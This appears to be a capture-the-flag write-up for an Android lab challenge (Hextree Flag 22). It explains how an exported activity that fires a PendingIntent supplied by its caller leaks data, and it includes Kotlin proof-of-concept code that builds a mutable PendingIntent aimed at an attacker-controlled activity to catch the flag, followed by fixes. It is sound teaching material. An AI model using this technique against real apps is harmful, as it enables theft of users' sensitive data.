# Flag 22 — Handing a Mutable PendingIntent to an Untrusted Caller

**Vulnerability category:** PendingIntent misuse
**Target component:** `io.hextree.attacksurface.activities.Flag22Activity` (exported)

---

## Target

`Flag22Activity` accepts a `PendingIntent` from the caller, as an extra named `"PENDING"` on the `Intent` used to launch it, and immediately fires it, attaching the flag as data:

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("PENDING");
    if (pendingIntent != null) {
        try {
            Intent intent = new Intent();
            intent.putExtra("success", true);
            intent.putExtra("flag", this.f.appendLog(this.flag));
            pendingIntent.send(this, 0, intent);
            success(null, this);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## Vulnerability

A `PendingIntent` is just a token that lets someone else fire an `Intent` *as if it came from the app that created it* — but the actual `Intent` the token wraps (its destination component, action, extras) is entirely defined by whoever created the `PendingIntent`, not by whoever ends up sending it.

Here, the attacker builds the `PendingIntent` themselves, pointing it at their **own** activity, and hands it to `Flag22Activity` as an extra. `Flag22Activity` treats "I was given a `PendingIntent`" as if it were a safe callback mechanism and calls `.send()` on it, attaching sensitive data (the flag) along the way. Because:

- The `PendingIntent` was created with `FLAG_MUTABLE`, and
- Its base `Intent` targets a component the attacker controls,

firing it delivers the flag straight into the attacker's own activity — no interception of system IPC needed, the victim app does the delivery itself.

## Approach

1. Build a `PendingIntent` pointing at our own `CatcherActivity`:

```kotlin
val backToMe = Intent(this, CatcherActivity::class.java)
val pi = PendingIntent.getActivity(
    this, 0, backToMe,
    PendingIntent.FLAG_MUTABLE
)
```

2. Pass it to the target as an extra on the launching intent:

```kotlin
val intent = Intent().apply {
    setClassName(TARGET, "$TARGET.activities.Flag22Activity")
    putExtra("PENDING", pi)
}
startActivity(intent)
```

3. `Flag22Activity` fires the `PendingIntent` (with the flag attached as part of the data it sends), which — since the `PendingIntent` is ours and mutable — lands directly in `CatcherActivity`, where it's read straight off the incoming intent's extras:

```kotlin
val flag = intent.getStringExtra("flag")
```

See [`exploit/HextreeMain.kt`](./exploit/HextreeMain.kt) (builds and sends the `PendingIntent`) and [`exploit/CatcherActivity.kt`](./exploit/CatcherActivity.kt) (receives the flag) for the full PoC.

## Why it works

`PendingIntent` is a delegation mechanism — accepting one from an untrusted caller means accepting that caller's chosen destination, action, and (for a mutable one) ability to influence the final `Intent`'s content. `Flag22Activity` never verifies where the `PendingIntent` it was handed actually points before sending sensitive data through it, so it ends up acting as an unwitting courier that delivers the flag to whatever component the attacker chose.

## Fix

- Never attach sensitive data to a `PendingIntent` supplied by an external caller without verifying what it targets. `PendingIntent.getCreatorPackage()` / `getCreatorUid()` (API 17+) can confirm which app actually created it.
- Where possible, avoid accepting a `PendingIntent` extra for this kind of callback entirely — use `startActivityForResult()` / an explicit broadcast back to a known, hardcoded component instead, so the destination isn't caller-supplied.
- If a `PendingIntent` extra genuinely needs to be accepted from outside, don't pass sensitive values into `.send()`'s fill-in `Intent` unless the sender's identity has been verified first.
